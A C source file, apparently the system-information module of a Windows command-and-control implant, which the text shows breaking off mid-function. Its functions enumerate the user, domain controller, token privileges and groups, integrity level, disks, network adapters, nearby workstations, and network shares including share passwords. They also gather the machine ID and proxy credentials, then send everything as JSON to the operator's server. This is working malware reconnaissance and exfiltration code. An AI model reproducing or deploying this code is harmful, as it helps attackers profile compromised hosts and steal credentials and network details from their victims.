#include <stdbool.h>
#include <process.h>
#include <stdio.h>
#include <stdint.h>
#include <direct.h>
#include <stdlib.h>
#include <Windows.h>
#include <winbase.h>
#include <WinUser.h>
#include <Lmcons.h>
#include <LMJoin.h>
#include <LMAPIbuf.h>
#include <LMaccess.h>
#include <LM.h>
#include <wow64apiset.h>
#include <lmshare.h>
#include <lmserver.h>
#include <sysinfoapi.h>
#include <time.h>
#include <intrin.h>
#include <fileapi.h>
#include <iphlpapi.h>
#include <processthreadsapi.h>
#include <securitybaseapi.h>
#include <wow64apiset.h>
#include "cJSON.h"
#include "agent_config.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_utility.h"
#include "agent_commands.h"

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "IPHLPAPI.lib")

static bool add_computer_name(cJSON* system_info) {
	uint32_t size = MAX_COMPUTERNAME_LENGTH + 1;
	cJSON* jcomputer_name = ZERO(cJSON);
	char *computer_name = MEM_ALLOC(size);
	if (!computer_name) goto fail;

	if (!GetComputerName(computer_name, &size)) goto fail;

	jcomputer_name = cJSON_CreateString(computer_name);
	if (!jcomputer_name) goto fail;
	if (!cJSON_AddItemToObject(system_info, "computer_name", jcomputer_name)) goto fail;
	FREE(computer_name);
	return true;
fail:
	FREE(computer_name);
	if (jcomputer_name) cJSON_Delete(jcomputer_name);
	return false;
}

static bool add_process_pid(cJSON* system_info) {
	cJSON* jpid = cJSON_CreateNumber(GetCurrentProcessId());
	if (!jpid) goto fail;
	if (!cJSON_AddItemToObject(system_info, "pid", jpid)) goto fail;
	return true;
fail:
	if (jpid) cJSON_Delete(jpid);
	return false;
}

static bool add_username(cJSON* system_info) {
	cJSON* jusername = ZERO(cJSON);
	size_t u_size = UNLEN + 1;
	char* username = MEM_ALLOC(UNLEN + 1);
	if (!username) goto fail;
	if (!GetUserName(username, &u_size)) goto fail;
	
	jusername = cJSON_CreateString(username);
	if (!jusername) goto fail;
	if (!cJSON_AddItemToObject(system_info, "username", jusername)) goto fail;

	free(username);
	return true;
fail:
	FREE(username);
	if (jusername) cJSON_Delete(jusername);
	return false;
}

static bool add_executable_fullpath(cJSON* system_info) {
	cJSON* jfilename = ZERO(cJSON);
	char filename[MAX_PATH] = { 0 };
	if (!GetModuleFileName(0, filename, sizeof filename)) goto fail;

	jfilename = cJSON_CreateString(filename);
	if (!jfilename) goto fail;
	if (!cJSON_AddItemToObject(system_info, "filename", jfilename)) goto fail;
	return true;
fail:
	if (jfilename) cJSON_Delete(jfilename);
	return false;
}

static bool add_workgroup(cJSON* system_info) {
	cJSON* jWorkgroup = ZERO(cJSON);
	wchar_t* workgroup = ZERO(wchar_t);
	char* ascii_workgroup = ZERO(char);
	NETSETUP_JOIN_STATUS join_status = NetSetupUnknownStatus;
	if (NetGetJoinInformation(0, &workgroup, &join_status)) goto fail;
	ascii_workgroup = unicode_to_ascii(workgroup);
	if (!ascii_workgroup) goto fail;

	jWorkgroup = cJSON_CreateString(ascii_workgroup);
	if (!jWorkgroup) goto fail;
	if (!cJSON_AddItemToObject(system_info, "workgroup", jWorkgroup)) goto fail;
	NetApiBufferFree(workgroup);
	FREE(ascii_workgroup);
	return true;
fail:
	FREE(ascii_workgroup);
	if (workgroup) NetApiBufferFree(workgroup);
	if (jWorkgroup) cJSON_Delete(jWorkgroup);
	return false;
}

static bool add_domain_controller_name(cJSON* system_info) {
	cJSON *jDomain = ZERO(cJSON);
	wchar_t *domain = ZERO(wchar_t);
	char *ascii_domain= ZERO(char);
	if (NetGetDCName(0, 0, (LPBYTE*)&domain)) goto fail;
	ascii_domain = unicode_to_ascii(domain);
	if (!ascii_domain) goto fail;

	jDomain = cJSON_CreateString(ascii_domain);
	if (!jDomain) goto fail;
	if (!cJSON_AddItemToObject(system_info, "domain", jDomain)) goto fail;
	NetApiBufferFree(domain);
	FREE(ascii_domain);
	return true;
fail:
	FREE(ascii_domain);
	if (domain) NetApiBufferFree(domain);
	if (jDomain) cJSON_Delete(jDomain);
	return false;
}

static bool add_architecture(cJSON* system_info) {
	cJSON* jArchitecture = ZERO(cJSON);
	jArchitecture = cJSON_CreateString(sizeof(uintptr_t) == 8 ? "x64" : "x86");
	if (!jArchitecture) goto fail;
	if (!cJSON_AddItemToObject(system_info, "architecture", jArchitecture)) goto fail;
	return true;
fail:
	if (jArchitecture) cJSON_Delete(jArchitecture);
	return false;
}

static bool add_os_version(cJSON* system_info) {
	cJSON* jOS = ZERO(cJSON);
	char* os = ZERO(char);
	OSVERSIONINFOEXW osVersionInfo = { 0 };

	// get version with native API
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
	if (!RtlGetVersion) goto fail;
	osVersionInfo.dwOSVersionInfoSize = sizeof(osVersionInfo);
	RtlGetVersion(&osVersionInfo);

	size_t size = snprintf(0, 0, "%d.%d.%d.%d SP %s %d.%d",
		osVersionInfo.dwMajorVersion,
		osVersionInfo.dwMinorVersion,
		osVersionInfo.dwBuildNumber,
		osVersionInfo.dwPlatformId,
		osVersionInfo.szCSDVersion,
		osVersionInfo.wServicePackMajor,
		osVersionInfo.wServicePackMinor
	) + 1;
	os = MEM_ALLOC(size);
	if (!os) goto fail;
	snprintf(os, size, "%d.%d.%d.%d SP %s %d.%d",
		osVersionInfo.dwMajorVersion,
		osVersionInfo.dwMinorVersion,
		osVersionInfo.dwBuildNumber,
		osVersionInfo.dwPlatformId,
		osVersionInfo.szCSDVersion,
		osVersionInfo.wServicePackMajor,
		osVersionInfo.wServicePackMinor
	);

	jOS = cJSON_CreateString(os);
	if (!jOS) goto fail;
	if (!cJSON_AddItemToObject(system_info, "os", jOS)) goto fail;	
	FREE(os);
	return true;
fail:
	FREE(os);
	if (jOS) cJSON_Delete(jOS);
	return false;
}

static bool add_localtime(cJSON* system_info) {
	cJSON* jTime = ZERO(cJSON);
	time_t t = { 0 };
	char date[512] = { 0 };
	t = time(ZERO(time_t));
	struct tm tm = { 0 };
	localtime_s(&tm, &t);
	strftime(date, sizeof(date), "%Y/%m/%e %H:%M:%S", &tm);

	jTime = cJSON_CreateString(date);
	if (!jTime) goto fail;
	if (!cJSON_AddItemToObject(system_info, "date", jTime)) goto fail;
	return true;
fail:
	if (jTime) cJSON_Delete(jTime);
	return false;
}

static bool add_keyboard_layout(cJSON* system_info) {
	char name[256] = { 0 };
	HKL lang = GetKeyboardLayout(0);
	LANGID language = PRIMARYLANGID(lang);
	LCID locale = MAKELCID(language, SORT_DEFAULT);
	GetLocaleInfo(locale, LOCALE_SLANGUAGE, name, 256);

	cJSON* jLang = ZERO(cJSON);
	jLang = cJSON_CreateString(name);
	if (!jLang) goto fail;
	if (!cJSON_AddItemToObject(system_info, "locale", jLang)) goto fail;
	return true;
fail:
	if (jLang) cJSON_Delete(jLang);
	return false;
}

static bool add_hardware_info(cJSON* system_info) {
	cJSON* jCpu = ZERO(cJSON);	
	cJSON* jRam = ZERO(cJSON);	

	// add CPU
	int CPUInfo[4] = { -1 };
	unsigned   nExIds, i = 0;
	char CPUBrandString[0x40];	
	__cpuid(CPUInfo, 0x80000000);
	nExIds = CPUInfo[0];
	for (i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);
		switch (i)
		{
		case 0x80000002:
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
			break;
		case 0x80000003:
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
			break;
		case 0x80000004:
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
			break;
		default:
			break;
		}
	}
	jCpu = cJSON_CreateString(CPUBrandString);
	if (!jCpu) goto fail;
	if (!cJSON_AddItemToObject(system_info, "CPU", jCpu)) goto fail;

	// add RAM
	MEMORYSTATUSEX statex = { 0 };
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);

	jRam = cJSON_CreateNumber(statex.ullTotalPhys);
	if (!jRam) goto fail;
	if (!cJSON_AddItemToObject(system_info, "RAM", jRam)) goto fail;
	return true;

fail:
	if (jCpu) cJSON_Delete(jCpu);
	if (jRam) cJSON_Delete(jRam);
	return false;
}

static bool add_disk_info(cJSON* system_info) {
	cJSON* jDisk = cJSON_CreateArray();
	if (!jDisk) goto fail;
	cJSON* jDrive = ZERO(cJSON);
	cJSON* jDrive_size = ZERO(cJSON);
	cJSON* jDrive_free = ZERO(cJSON);
	cJSON* jDrive_name = ZERO(cJSON);
	cJSON* jVolume_name = ZERO(cJSON);
	cJSON* jFS_name = ZERO(cJSON);

	uint32_t mask = GetLogicalDrives();
	for (size_t i = 'A'; i < 'Z'; i++) {
		if (mask & (1 << (i - 'A'))) {
			char drive_name[] = { (char)i, ':', 0, 0 };
			jDrive = cJSON_CreateObject();
			if (!jDrive) goto fail;
			if (!cJSON_AddItemToArray(jDisk, jDrive)) goto fail;

			jDrive_name = cJSON_CreateString(drive_name);
			if (!jDrive_name) goto fail;
			if (!cJSON_AddItemToObject(jDrive, "name", jDrive_name)) goto fail;
						
			ULARGE_INTEGER disk_size = { 0 };
			ULARGE_INTEGER free_bytes = { 0 };
			if (!GetDiskFreeSpaceEx(drive_name, 0, &disk_size, &free_bytes)) continue;

			jDrive_size = cJSON_CreateNumber(disk_size.QuadPart);
			if (!jDrive_size) goto fail;
			if (!cJSON_AddItemToObject(jDrive, "size", jDrive_size)) goto fail;

			jDrive_free = cJSON_CreateNumber(free_bytes.QuadPart);
			if (!jDrive_free) goto fail;
			if (!cJSON_AddItemToObject(jDrive, "free", jDrive_free)) goto fail;

			char volume_name[MAX_PATH + 1] = { 0 };
			char filesystem_buffer_name[MAX_PATH + 1] = { 0 };
			drive_name[2] = '\\';
			if (!GetVolumeInformationA(
				drive_name, 
				volume_name, 
				sizeof(volume_name), 
				0, 
				0, 
				0, 
				filesystem_buffer_name, 
				sizeof(filesystem_buffer_name)
			)) goto fail;

			jVolume_name = cJSON_CreateString(volume_name);
			if (!jVolume_name) goto fail;
			if (!cJSON_AddItemToObject(jDrive, "label", jVolume_name)) goto fail;

			jFS_name = cJSON_CreateString(filesystem_buffer_name);
			if (!jFS_name) goto fail;
			if (!cJSON_AddItemToObject(jDrive, "fs", jFS_name)) goto fail;
		}
	}

	if (!cJSON_AddItemToObject(system_info, "disk", jDisk)) goto fail;
	return true;
fail:	
	if (jDisk) cJSON_Delete(jDisk);
	return false;
}

static bool add_network_interfaces(cJSON* system_info) {
	cJSON* jInterfaces = cJSON_CreateObject();
	if (!jInterfaces) goto fail;
	if (!cJSON_AddItemToObject(system_info, "interfaces", jInterfaces)) goto fail;

	PFIXED_INFO pFixedInfo = ZERO(FIXED_INFO);
	PIP_ADAPTER_INFO pAdapterInfo = ZERO(IP_ADAPTER_INFO);
	size_t size = 0;

	// add DNS
	if (GetNetworkParams(ZERO(FIXED_INFO), &size) != ERROR_BUFFER_OVERFLOW) goto fail;
	pFixedInfo = MEM_ALLOC(size);
	if (!pFixedInfo) goto fail;
	if (GetNetworkParams(pFixedInfo, &size) != ERROR_SUCCESS) goto fail;
	cJSON* jDns = cJSON_CreateArray();
	if (!cJSON_AddItemToObject(jInterfaces, "dns", jDns)) goto fail;
	
	PIP_ADDR_STRING pAddrStr = &pFixedInfo->DnsServerList;
	while (pAddrStr) {
		cJSON* jDnsi = cJSON_CreateString(pAddrStr->IpAddress.String);
		cJSON_AddItemToArray(jDns, jDnsi);
		pAddrStr = pAddrStr->Next;
	}

	// add adapters info
	size = 0;
	if (GetAdaptersInfo(ZERO(IP_ADAPTER_INFO), &size) != ERROR_BUFFER_OVERFLOW) goto fail;
	pAdapterInfo = MEM_ALLOC(size);
	if (!pAdapterInfo) goto fail;
	if (GetAdaptersInfo(pAdapterInfo, &size) != NO_ERROR) goto fail;

	cJSON* jAdapters = cJSON_CreateObject();
	if (!cJSON_AddItemToObject(jInterfaces, "adapters", jAdapters)) goto fail;
	while (pAdapterInfo) {
		cJSON* jAdapter = cJSON_CreateObject();
		if (!cJSON_AddItemToObject(jAdapters, pAdapterInfo->AdapterName, jAdapter)) goto fail;

		cJSON* jAdapterDesc = cJSON_CreateString(pAdapterInfo->Description);
		if (!cJSON_AddItemToObject(jAdapter, "description", jAdapterDesc)) goto fail;

		cJSON* jAdapterAddressList = cJSON_CreateArray();
		if (!cJSON_AddItemToObject(jAdapter, "addresses", jAdapterAddressList)) goto fail;

		pAddrStr = &pAdapterInfo->IpAddressList;
		while (pAddrStr) {
			cJSON* jAddress = cJSON_CreateObject();			
			cJSON* jIP = cJSON_CreateString(pAddrStr->IpAddress.String);
			cJSON_AddItemToObject(jAddress, "ip", jIP);
			cJSON* jAddressMask = cJSON_CreateString(pAddrStr->IpMask.String);
			cJSON_AddItemToObject(jAddress, "netmask", jAddressMask);
			cJSON_AddItemToArray(jAdapterAddressList, jAddress);
			pAddrStr = pAddrStr->Next;
		}

		pAdapterInfo = pAdapterInfo->Next;
	}

	FREE(pFixedInfo);
	FREE(pAdapterInfo);
	return true;
fail:
	FREE(pFixedInfo);
	FREE(pAdapterInfo);
	if (jInterfaces) cJSON_Delete(jInterfaces);
	return false;
}

static bool add_network_servers(cJSON* system_info) {
	cJSON* network_servers = ZERO(cJSON);
	SERVER_INFO_101* server_info = ZERO(SERVER_INFO_101);
	size_t count = 0;
	size_t total_count = 0;
	char* name = ZERO(char);
	char* comment = ZERO(char);

	if (NetServerEnum(
		0, 
		101, 
		&server_info, 
		MAX_PREFERRED_LENGTH, 
		&count, 
		&total_count, 
		SV_TYPE_WORKSTATION, 
		NULL, 
		0
	) != NERR_Success) goto fail;

	network_servers = cJSON_CreateArray();
	if (!cJSON_AddItemToObject(system_info, "network", network_servers)) goto fail;
	SERVER_INFO_101* server_info_ptr = server_info;
	for (size_t i = 0; i < total_count; i++) {
		cJSON* jServer = cJSON_CreateObject();
		cJSON_AddItemToArray(network_servers, jServer);

		char* comment = unicode_to_ascii(server_info_ptr->sv101_comment);
		cJSON* jComment = cJSON_CreateString(comment);
		cJSON_AddItemToObject(jServer, "comment", jComment);

		char* name = unicode_to_ascii(server_info_ptr->sv101_name);
		cJSON* jName = cJSON_CreateString(name);
		cJSON_AddItemToObject(jServer, "name", jName);
		
		FREE(comment);
		FREE(name);
		server_info_ptr++;
	}
	NetApiBufferFree(server_info);	

	return true;
fail:
	if (network_servers)  cJSON_Delete(network_servers);
	if (server_info) NetApiBufferFree(server_info);
	return false;
}

static bool add_network_resources(cJSON* system_info) {
	cJSON* network_resources = ZERO(cJSON);
	SHARE_INFO_502* share_info = ZERO(SHARE_INFO_502);
	size_t count = 0;
	size_t total_count = 0;
	char* name = ZERO(char);

	if (NetShareEnum(
		0,
		502,
		(byte*)&share_info,
		MAX_PREFERRED_LENGTH,
		&count,
		&total_count,
		0
	) != NERR_Success) goto fail;

	network_resources = cJSON_CreateArray();
	if (!cJSON_AddItemToObject(system_info, "shares", network_resources)) goto fail;
	SHARE_INFO_502* share_info_ptr = share_info;
	for (size_t i = 0; i < total_count; i++) {
		cJSON* jResource = cJSON_CreateObject();
		cJSON_AddItemToArray(network_resources, jResource);

		char* netname = unicode_to_ascii(share_info_ptr->shi502_netname);
		cJSON* jComment = cJSON_CreateString(netname);
		cJSON_AddItemToObject(jResource, "netname", jComment);

		if (share_info_ptr->shi502_passwd) {
			char* passwd = unicode_to_ascii(share_info_ptr->shi502_passwd);
			cJSON* jPasswd = cJSON_CreateString(passwd);
			cJSON_AddItemToObject(jResource, "passwd", jPasswd);
			FREE(passwd);
		}		

		char* remark = unicode_to_ascii(share_info_ptr->shi502_remark);
		cJSON* jRemark = cJSON_CreateString(remark);
		cJSON_AddItemToObject(jResource, "remark", jRemark);

		char* path = unicode_to_ascii(share_info_ptr->shi502_path);
		cJSON* jPath = cJSON_CreateString(path);
		cJSON_AddItemToObject(jResource, "path", jPath);

		FREE(netname);		
		FREE(remark);
		FREE(path);
		share_info_ptr++;
	}
	
	NetApiBufferFree(share_info);
	return true;
fail:
	if (network_resources)  cJSON_Delete(network_resources);
	if (share_info) NetApiBufferFree(share_info);
	return false;
}

static bool add_agent_version(cJSON* system_info) {
	cJSON* jversion = cJSON_CreateString(AGENT_VERSION);
	if (!jversion) goto fail;
	if (!cJSON_AddItemToObject(system_info, "version", jversion)) goto fail;
	return true;
fail:
	if (jversion) cJSON_Delete(jversion);
	return false;
}

static bool add_server_channel(session* sess, cJSON* system_info) {
	cJSON* jchannel = cJSON_CreateString(sess->active_server_type);
	if (!jchannel) goto fail;
	if (!cJSON_AddItemToObject(system_info, "channel", jchannel)) goto fail;
	return true;
fail:
	if (jchannel) cJSON_Delete(jchannel);
	return false;
}

static bool add_server_address(session* sess, cJSON* system_info) {
	char* c2_address = ZERO(char);
	size_t addr_size = 0;

	if (!sess->active_server) goto fail;
	cJSON* addr = cJSON_GetObjectItemCaseSensitive(sess->active_server, CONFIG_SERVER_ADDRESS);
	cJSON* port = cJSON_GetObjectItemCaseSensitive(sess->active_server, CONFIG_SERVER_PORT);
	if (!addr || !port) goto fail;

	addr_size = snprintf(0, 0, "%s:%d", addr->valuestring, port->valueint);
	if (!addr_size) goto fail;
	c2_address = MEM_ALLOC(addr_size + 2);
	if (!c2_address) goto fail;
	snprintf(c2_address, addr_size + 1, "%s:%d", addr->valuestring, port->valueint);

	cJSON* jchannel = cJSON_CreateString(c2_address);
	if (!jchannel) goto fail;
	if (!cJSON_AddItemToObject(system_info, "server", jchannel)) goto fail;
	FREE(c2_address);
	return true;
fail:
	if (jchannel) cJSON_Delete(jchannel);
	FREE(c2_address);
	return false;
}

static bool add_integrity_level(cJSON* system_info) {
	HANDLE hProcessToken = 0;
	size_t size = 0;
	PTOKEN_MANDATORY_LABEL pTml = ZERO(TOKEN_MANDATORY_LABEL);
	cJSON* jintegrity = ZERO(cJSON);
	const char* integrity_level = "";

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) goto fail;
	GetTokenInformation(hProcessToken, TokenIntegrityLevel, NULL, 0, &size);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto fail;
	pTml = MEM_ALLOC(size);
	if (!pTml) goto fail;
	if (!GetTokenInformation(hProcessToken, TokenIntegrityLevel, pTml, size, &size)) goto fail;
	uint32_t ridIl = *GetSidSubAuthority(pTml->Label.Sid, 0);
	if (ridIl < SECURITY_MANDATORY_LOW_RID) integrity_level = "?";
	else if (ridIl >= SECURITY_MANDATORY_LOW_RID && ridIl < SECURITY_MANDATORY_MEDIUM_RID) integrity_level = "Low";
	else if (ridIl >= SECURITY_MANDATORY_MEDIUM_RID && ridIl < SECURITY_MANDATORY_HIGH_RID) integrity_level = "Medium";
	else if (ridIl >= SECURITY_MANDATORY_HIGH_RID && ridIl < SECURITY_MANDATORY_SYSTEM_RID) integrity_level = "High";
	else if (ridIl >= SECURITY_MANDATORY_SYSTEM_RID) integrity_level = "System";
	
	jintegrity = cJSON_CreateString(integrity_level);
	if (!jintegrity) goto fail;
	if (!cJSON_AddItemToObject(system_info, "integrity", jintegrity)) goto fail;

	FREE(pTml);
	return true;

fail:
	FREE(pTml);
	if (jintegrity) cJSON_Delete(jintegrity);
	return false;
}

static bool add_elevated(cJSON* system_info) {
	HANDLE hProcessToken = 0;
	size_t size = 0;
	PTOKEN_ELEVATION_TYPE pElevation = ZERO(TOKEN_ELEVATION_TYPE);
	cJSON* jelevated = ZERO(cJSON);
	const char* eleveted_type = "";
	
	// get elevation type
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) goto fail;
	GetTokenInformation(hProcessToken, TokenElevationType, NULL, 0, &size);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto fail;
	pElevation = MEM_ALLOC(size);
	if (!pElevation) goto fail;
	if (!GetTokenInformation(hProcessToken, TokenElevationType, pElevation, size, &size)) goto fail;

	if (*pElevation == TokenElevationTypeDefault) eleveted_type = "default";
	else if (*pElevation == TokenElevationTypeFull) eleveted_type = "elevated";
	else if (*pElevation == TokenElevationTypeLimited) eleveted_type = "limited";
	
	// write result
	jelevated = cJSON_CreateString(eleveted_type);
	if (!jelevated) goto fail;
	if (!cJSON_AddItemToObject(system_info, "elevated", jelevated)) goto fail;

	FREE(pElevation);
	return true;

fail:
	FREE(pElevation);
	if (jelevated) cJSON_Delete(jelevated);
	return false;
}

static bool add_groups(cJSON* system_info) {
	HANDLE hProcessToken = 0;
	size_t size = 0;
	PTOKEN_GROUPS pTokenGroups = ZERO(TOKEN_GROUPS);
	cJSON* jgroups = ZERO(cJSON);
	cJSON* jgroup = ZERO(cJSON);
	LPSTR name = NULL;
	LPSTR domain = NULL;
	LPSTR buffer = NULL;

	// get groups
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) goto fail;
	GetTokenInformation(hProcessToken, TokenGroups, NULL, 0, &size);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto fail;
	pTokenGroups = MEM_ALLOC(size);
	if (!pTokenGroups) goto fail;
	if (!GetTokenInformation(hProcessToken, TokenGroups, pTokenGroups, size, &size)) goto fail;

	// write result
	jgroups = cJSON_CreateArray();
	if (!jgroups) goto fail;

	for (size_t i = 0; i < pTokenGroups->GroupCount; i++) {
		// get group info
		SID_AND_ATTRIBUTES  group = pTokenGroups->Groups[i];
		SID_NAME_USE peUse = { 0 };
		size_t size_name = 0;
		size_t size_domain = 0;
		LookupAccountSid(NULL, group.Sid, NULL, &size_name, NULL, &size_domain, &peUse);
		name = MEM_ALLOC(size_name * sizeof(TCHAR));
		if (!name) goto fail;
		domain = MEM_ALLOC(size_domain * sizeof(TCHAR));
		if (!domain) goto fail;
		if (!LookupAccountSid(NULL, group.Sid, name, &size_name, domain, &size_domain, &peUse)) goto fail;

		// compose string
		if (size_domain) {
			size_t buff_size = snprintf(0, 0, "%s/%s", domain, name);
			if (!buff_size) goto fail;
			buffer = MEM_ALLOC(buff_size + sizeof(TCHAR));
			if (!buffer) goto fail;
			snprintf(buffer, buff_size + sizeof(TCHAR), "%s/%s", domain, name);
		}
		else {
			buffer = MEM_ALLOC(size_name + sizeof(TCHAR));
			if (!buffer) goto fail;
			memcpy(buffer, name, size_name);
		}		

		// add new item
		jgroup = cJSON_CreateString(buffer);
		if (!jgroup) goto fail;
		if (!cJSON_AddItemToArray(jgroups, jgroup)) goto fail;

		FREE(name);
		FREE(domain);
		FREE(buffer);
	}

	if (!cJSON_AddItemToObject(system_info, "groups", jgroups)) goto fail;

	FREE(pTokenGroups);
	return true;

fail:
	FREE(pTokenGroups);
	FREE(name);
	FREE(domain);
	FREE(buffer);
	if (jgroups) cJSON_Delete(jgroups);
	return false;
}

static bool add_privileges(cJSON* system_info) {
	HANDLE hProcessToken = 0;
	size_t size = 0;
	PTOKEN_PRIVILEGES pTokenPrivs = ZERO(TOKEN_PRIVILEGES);
	cJSON* jprivs = ZERO(cJSON);
	cJSON* jpriv = ZERO(cJSON);
	LPSTR name = NULL;

	// get token privileges
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) goto fail;
	GetTokenInformation(hProcessToken, TokenPrivileges, NULL, 0, &size);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto fail;
	pTokenPrivs = MEM_ALLOC(size);
	if (!pTokenPrivs) goto fail;
	if (!GetTokenInformation(hProcessToken, TokenPrivileges, pTokenPrivs, size, &size)) goto fail;

	// write result
	jprivs = cJSON_CreateArray();
	if (!jprivs) goto fail;

	for (size_t i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
		// get privilege info
		LUID_AND_ATTRIBUTES priv = pTokenPrivs->Privileges[i];

		char enabled = 0;
		if (priv.Attributes & SE_PRIVILEGE_ENABLED) enabled = '+';
		else if (priv.Attributes & SE_PRIVILEGE_REMOVED) enabled = '-';

		size_t name_size = 0;
		LookupPrivilegeName(NULL, &priv.Luid, NULL, &name_size);
		name = MEM_ALLOC(name_size + 2 * sizeof(TCHAR));
		if (!name) goto fail;
		if (enabled) {
			if (!LookupPrivilegeName(NULL, &priv.Luid, name + 1, &name_size)) goto fail;
			name[0] = enabled;
		}
		else if (!LookupPrivilegeName(NULL, &priv.Luid, name, &name_size)) goto fail;

		// add new item
		jpriv = cJSON_CreateString(name);
		if (!jpriv) goto fail;
		if (!cJSON_AddItemToArray(jprivs, jpriv)) goto fail;
		FREE(name);
	}

	if (!cJSON_AddItemToObject(system_info, "privileges", jprivs)) goto fail;

	FREE(pTokenPrivs);
	return true;

fail:
	FREE(pTokenPrivs);
	FREE(name);
	if (jprivs) cJSON_Delete(jprivs);
	return false;
}

static bool add_current_working_directory(cJSON* system_info) {
	cJSON* jworking_dir = ZERO(cJSON);
	char* working_dir[4096] = { 0 };
	if (!_getcwd(working_dir, sizeof working_dir)) goto fail;

	jworking_dir = cJSON_CreateString(working_dir);
	if (!jworking_dir) goto fail;
	if (!cJSON_AddItemToObject(system_info, "cwd", jworking_dir)) goto fail;
	return true;
fail:
	if (jworking_dir) cJSON_Delete(jworking_dir);
	return false;
}

static bool add_proxy_info(session* sess, cJSON* system_info) {
	cJSON* jproxy_info = ZERO(cJSON);
	char* proxy_address = ZERO(char);

	if (sess->proxy) {
		int n = snprintf(
			0,
			0,
			"socks5://%s:%s@%s:%d",
			sess->proxy->username,
			sess->proxy->password,
			sess->proxy->address,
			sess->proxy->port
		) + 1;
		proxy_address = MEM_ALLOC(n);
		if (!proxy_address) goto fail;
		snprintf(
			proxy_address,
			n,
			"socks5://%s:%s@%s:%d",
			sess->proxy->username,
			sess->proxy->password,
			sess->proxy->address,
			sess->proxy->port
		);
	}
	else {
		proxy_address = MEM_ALLOC(1);
		proxy_address[0] = 0;
	}

	jproxy_info = cJSON_CreateString(proxy_address);
	if (!jproxy_info) goto fail;
	if (!cJSON_AddItemToObject(system_info, "proxy", jproxy_info)) goto fail;
	FREE(proxy_address);
	return true;
fail:
	if (jproxy_info) cJSON_Delete(jproxy_info);
	return false;
}

bool add_machine_id(cJSON* system_info)
{
	HKEY hKey = 0;
	DWORD size = 0;
	cJSON* jmachine_id = ZERO(cJSON);
	char* machine_id = ZERO(char);

	// get machine ID from registry
	if (ERROR_SUCCESS != RegOpenKeyExA(
		HKEY_LOCAL_MACHINE, 
		"SOFTWARE\\Microsoft\\SQMClient", 
		REG_OPTION_OPEN_LINK, 
		KEY_QUERY_VALUE | KEY_WOW64_64KEY, 
		&hKey
	)) goto fail;	
	if (ERROR_SUCCESS != RegQueryValueExA(hKey, "MachineID", 0, NULL, NULL, &size)) goto fail;	
	machine_id = MEM_ALLOC(size);
	if (!machine_id) goto fail;
	if (ERROR_SUCCESS != RegQueryValueExA(hKey, "MachineID", 0, NULL, machine_id, &size)) goto fail;
	RegCloseKey(hKey);
	
	jmachine_id = cJSON_CreateString(machine_id);
	if (!jmachine_id) goto fail;	

	if (!cJSON_AddItemToObject(system_info, "machine_id", jmachine_id)) goto fail;
	FREE(machine_id);
	return true;
fail:
	if (jmachine_id) cJSON_Delete(jmachine_id);
	return false;
}

bool get_extended_system_info(session* sess, packet* pck) {
	message* msg = ZERO(message);
	cJSON* system_info = cJSON_CreateObject();
	if (!system_info) goto fail;

	// fill basic information
	add_process_pid(system_info);
	add_architecture(system_info);
	add_computer_name(system_info);
	add_username(system_info);
	add_executable_fullpath(system_info);
	add_os_version(system_info);
	add_machine_id(system_info);
	add_agent_version(system_info);
	add_server_channel(sess, system_info);
	add_server_address(sess, system_info);
	add_integrity_level(system_info);
	add_workgroup(system_info);
	add_domain_controller_name(system_info);
	add_elevated(system_info);
	add_groups(system_info);
	add_privileges(system_info);
	add_current_working_directory(system_info);
	add_proxy_info(sess, system_info);

	// fill advanced information	
	add_architecture(system_info);	
	add_localtime(system_info);	
	add_keyboard_layout(system_info);
	add_hardware_info(system_info);
	add_disk_info(system_info);
	add_network_interfaces(system_info);
	add_network_servers(system_info);
	add_network_resources(system_info);
	
	// send result	
	char* str_sysinfo = ZERO(char);
	str_sysinfo = cJSON_Print(system_info);
	if (!str_sysinfo) goto fail;

	msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		strlen(str_sysinfo) + 1,
		str_sysinfo,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;

	// free resources	
	message_free(msg);
	FREE(str_sysinfo);
	cJSON_Delete(system_info);
	return true;

fail:
	if (system_info) cJSON_Delete(system_info);
	if (msg) message_free(msg);
	FREE(str_sysinfo);
	return false;
}

bool get_system_info(session* sess, packet* pck) {
	message* msg = ZERO(message);
	char* str_sysinfo = ZERO(char);
	cJSON* system_info = cJSON_CreateObject();
	if (!system_info) goto fail;

	// fill information
	add_process_pid(system_info);
	add_architecture(system_info);
	add_computer_name(system_info);
	add_username(system_info);
	add_executable_fullpath(system_info);
	add_os_version(system_info);
	add_machine_id(system_info);
	add_agent_version(system_info);
	add_server_channel(sess, system_info);
	add_server_address(sess, system_info);
	add_integrity_level(system_info);
	add_workgroup(system_info);
	add_domain_controller_name(system_info);
	add_elevated(system_info);
	add_groups(system_info);
	add_privileges(system_info);
	add_current_working_directory(system_info);
	add_proxy_info(sess, system_info);

	// send result
	str_sysinfo = cJSON_Print(system_info);
	if (!str_sysinfo) goto fail;

	msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		strlen(str_sysinfo) + 1,
		str_sysinfo,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto fail;
